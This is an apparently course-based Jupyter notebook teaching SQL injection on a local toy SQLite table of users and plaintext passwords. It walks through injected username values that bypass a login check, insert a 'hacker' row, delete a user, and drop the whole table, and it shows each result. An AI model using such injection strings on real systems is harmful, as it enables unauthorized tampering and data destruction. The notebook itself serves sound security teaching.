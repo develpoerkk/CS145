{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection Activity"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/zhangrao/.local/lib/python2.7/site-packages/IPython/config.py:13: ShimWarning: The `IPython.config` package has been deprecated. You should import from traitlets.config instead.\n",
      "  \"You should import from traitlets.config instead.\", ShimWarning)\n",
      "/Users/zhangrao/.local/lib/python2.7/site-packages/IPython/utils/traitlets.py:5: UserWarning: IPython.utils.traitlets has moved to a top-level traitlets package.\n",
      "  warn(\"IPython.utils.traitlets has moved to a top-level traitlets package.\")\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'Connected: None@None'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%load_ext sql\n",
    "%sql sqlite://"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Table Creation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n",
      "Done.\n",
      "1 rows affected.\n",
      "1 rows affected.\n",
      "1 rows affected.\n",
      "1 rows affected.\n",
      "1 rows affected.\n",
      "1 rows affected.\n",
      "1 rows affected.\n"
     ]
    }
   ],
   "source": [
    "%sql DROP TABLE IF EXISTS users\n",
    "%sql CREATE TABLE IF NOT EXISTS users(name VARCHAR(255), password VARCHAR(255))\n",
    "names = ['alice', 'bob', 'chris', 'alex', 'jessie', 'sarah', 'jason']\n",
    "passwords = ['cs145', 'databases', 'stanford', 'cardinal', 'password', 'abc123', 'sql']\n",
    "for (n,p) in zip(names,passwords):\n",
    "    %sql INSERT INTO users(name, password) VALUES (:n, :p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Sign Up\n",
    "You can also insert your own login and password! (Note: this is not secure so please don't put any real passwords)\n",
    "\n",
    "Execute the cell below to create your own login"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": false,
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Welcome to our sign up page! Please enter your information below.\n",
      "username: zr\n",
      "password: zr\n",
      "1 rows affected.\n",
      "Sign up successful! Please try logging in below\n"
     ]
    }
   ],
   "source": [
    "print \"Welcome to our sign up page! Please enter your information below.\"\n",
    "username = raw_input(\"username: \")\n",
    "password = raw_input(\"password: \")\n",
    "%sql INSERT INTO users(name, password) VALUES (:username, :password)\n",
    "print \"Sign up successful! Please try logging in below\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Check to see your login info should now be in the table!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<table>\n",
       "    <tr>\n",
       "        <th>name</th>\n",
       "        <th>password</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>alice</td>\n",
       "        <td>cs145</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>bob</td>\n",
       "        <td>databases</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>chris</td>\n",
       "        <td>stanford</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>alex</td>\n",
       "        <td>cardinal</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>jessie</td>\n",
       "        <td>password</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>sarah</td>\n",
       "        <td>abc123</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>jason</td>\n",
       "        <td>sql</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>zr</td>\n",
       "        <td>zr</td>\n",
       "    </tr>\n",
       "</table>"
      ],
      "text/plain": [
       "[(u'alice', u'cs145'),\n",
       " (u'bob', u'databases'),\n",
       " (u'chris', u'stanford'),\n",
       " (u'alex', u'cardinal'),\n",
       " (u'jessie', u'password'),\n",
       " (u'sarah', u'abc123'),\n",
       " (u'jason', u'sql'),\n",
       " (u'zr', u'zr')]"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%sql SELECT * FROM users"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Login\n",
    "Below is a *highly* simplified view of the backend of a website login service.\n",
    "\n",
    "Run the cell below to test it out!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "username: zr\n",
      "password: zr\n",
      "Done.\n",
      "Login successful!\n"
     ]
    }
   ],
   "source": [
    "username = raw_input(\"username: \")\n",
    "password = raw_input(\"password: \")\n",
    "result = %sql SELECT password FROM users WHERE name= :username\n",
    "if (username != \"\" and password != \"\" and len(result) > 0 and result[0][0] == password):\n",
    "    print \"Login successful!\"\n",
    "else:\n",
    "    print \"Go away hacker!\" #probably do something more menacing in production"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "-----------------------------\n",
    "Now time for some hacking! Well, sort of. Notice that the value for \"username\" is directly substituted into the sql expression above for checking the user's password. So what would happen if we use the value\n",
    "\n",
    "> `username:` ' ' OR password='password'\n",
    "\n",
    "> `password:` password\n",
    "\n",
    "##### Note: ipython-sqlite does not allow for substitution of whole strings into variables (which is actually a good thing from a security standpoint!), so these exercises may not work if you try to log in with them. For that reason we'll be writing the solution directly into the sql statements below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%sql SELECT password FROM users WHERE name=' ' OR password='password'\n"
     ]
    }
   ],
   "source": [
    "# Think about what this query will do before running it (no need to modify anything, just think then run it)\n",
    "username = \"' ' OR password='password'\"\n",
    "password = \"password\"\n",
    "\n",
    "query = \"%sql SELECT password FROM users WHERE name=\" + username\n",
    "print query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<table>\n",
       "    <tr>\n",
       "        <th>password</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>password</td>\n",
       "    </tr>\n",
       "</table>"
      ],
      "text/plain": [
       "[(u'password',)]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Paste the code here to run and test it (and think about what the result implies)\n",
    "%sql SELECT password FROM users WHERE name=' ' OR password='password'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hack Away!\n",
    "\n",
    "Now think about how a malicious hacker (not necessarily redundant) can use the idea of sql injection to cause harm to the underlying database. In particular, can you provide a combination of username and password that would lead to\n",
    "\n",
    "> * `inserting a new tuple`\n",
    "> * `deleting an existing tuple`\n",
    "> * `deleting the entire table`\n",
    "\n",
    "Hint: sql statements are separated by semicolons"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Enter the username/password for each of the above 3 exercises below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%sql SELECT password FROM users WHERE name='';INSERT INTO users(password, name) values('malicious', 'hacker');\n"
     ]
    }
   ],
   "source": [
    "#Inserting a new tuple username: 'malicious', password: 'hacker' \n",
    "#(might be useful if the query is against a secret database users don't usually have access to)\n",
    "username = \"'';INSERT INTO users(password, name) values('malicious', 'hacker');\"\n",
    "password = \"\"\n",
    "\n",
    "#Don't modify below this comment\n",
    "query = \"%sql SELECT password FROM users WHERE name=\" + username;\n",
    "print query"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After running the cell above, copy the output into the cell below and run it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n",
      "1 rows affected.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Paste the code here to run and test it\n",
    "%sql SELECT password FROM users WHERE name='';INSERT INTO users(password, name) values('malicious', 'hacker');"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<table>\n",
       "    <tr>\n",
       "        <th>name</th>\n",
       "        <th>password</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>alice</td>\n",
       "        <td>cs145</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>bob</td>\n",
       "        <td>databases</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>chris</td>\n",
       "        <td>stanford</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>alex</td>\n",
       "        <td>cardinal</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>jessie</td>\n",
       "        <td>password</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>sarah</td>\n",
       "        <td>abc123</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>jason</td>\n",
       "        <td>sql</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>zr</td>\n",
       "        <td>zr</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>hacker</td>\n",
       "        <td>malicious</td>\n",
       "    </tr>\n",
       "</table>"
      ],
      "text/plain": [
       "[(u'alice', u'cs145'),\n",
       " (u'bob', u'databases'),\n",
       " (u'chris', u'stanford'),\n",
       " (u'alex', u'cardinal'),\n",
       " (u'jessie', u'password'),\n",
       " (u'sarah', u'abc123'),\n",
       " (u'jason', u'sql'),\n",
       " (u'zr', u'zr'),\n",
       " (u'hacker', u'malicious')]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Now run this cell to make sure it worked!\n",
    "%sql SELECT * FROM users;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%sql SELECT password FROM users WHERE name='';DELETE FROM users WHERE name='alice'\n"
     ]
    }
   ],
   "source": [
    "#Deleting an existing tuple (specifically, alice)\n",
    "username = \"'';DELETE FROM users WHERE name='alice'\"\n",
    "password = \"\"\n",
    "\n",
    "#Don't modify below this comment\n",
    "query = \"%sql SELECT password FROM users WHERE name=\" + username;\n",
    "print query"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After running the cell above, copy the output into the cell below and run it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n",
      "1 rows affected.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Paste the code here to run and test it\n",
    "%sql SELECT password FROM users WHERE name='';DELETE FROM users WHERE name='alice'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<table>\n",
       "    <tr>\n",
       "        <th>name</th>\n",
       "        <th>password</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>bob</td>\n",
       "        <td>databases</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>chris</td>\n",
       "        <td>stanford</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>alex</td>\n",
       "        <td>cardinal</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>jessie</td>\n",
       "        <td>password</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>sarah</td>\n",
       "        <td>abc123</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>jason</td>\n",
       "        <td>sql</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>zr</td>\n",
       "        <td>zr</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td>hacker</td>\n",
       "        <td>malicious</td>\n",
       "    </tr>\n",
       "</table>"
      ],
      "text/plain": [
       "[(u'bob', u'databases'),\n",
       " (u'chris', u'stanford'),\n",
       " (u'alex', u'cardinal'),\n",
       " (u'jessie', u'password'),\n",
       " (u'sarah', u'abc123'),\n",
       " (u'jason', u'sql'),\n",
       " (u'zr', u'zr'),\n",
       " (u'hacker', u'malicious')]"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Now run this cell to make sure it worked!\n",
    "%sql SELECT * FROM users;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%sql SELECT password FROM users WHERE name='';DROP TABLE users\n"
     ]
    }
   ],
   "source": [
    "#Deleting the entire table\n",
    "username = \"'';DROP TABLE users\"\n",
    "password = \"\"\n",
    "\n",
    "#Don't modify below this comment\n",
    "query = \"%sql SELECT password FROM users WHERE name=\" + username;\n",
    "print query"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After running the cell above, copy the output into the cell below and run it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done.\n",
      "Done.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Paste the code here to run and test it\n",
    "%sql SELECT password FROM users WHERE name='';DROP TABLE users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(sqlite3.OperationalError) no such table: users [SQL: u'SELECT * FROM users;']\n"
     ]
    }
   ],
   "source": [
    "#Now run this cell to make sure it worked!\n",
    "%sql SELECT * FROM users;"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "For more info on sql injection, check out https://en.wikipedia.org/wiki/SQL_injection"
   ]
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "kernelspec": {
   "display_name": "Python [Root]",
   "language": "python",
   "name": "Python [Root]"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
